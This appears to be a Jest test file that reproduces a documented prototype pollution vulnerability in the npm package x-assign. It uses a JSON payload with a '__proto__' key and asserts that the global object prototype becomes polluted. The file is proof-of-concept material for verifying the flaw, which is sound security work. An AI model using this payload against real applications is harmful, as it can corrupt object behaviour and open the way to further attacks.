//https://security.snyk.io/vuln/SNYK-JS-XASSIGN-1759314
test("prototype pollution in x-assign", () => {
  const XAssign = require("x-assign");

  expect({}.polluted).toBe(undefined);

  const a = { red: "apple" };
  const b = JSON.parse('{"__proto__": {"polluted": "yes"}}');
  const c = XAssign.assign(a, b);

  expect({}.polluted).toBe("yes");
});
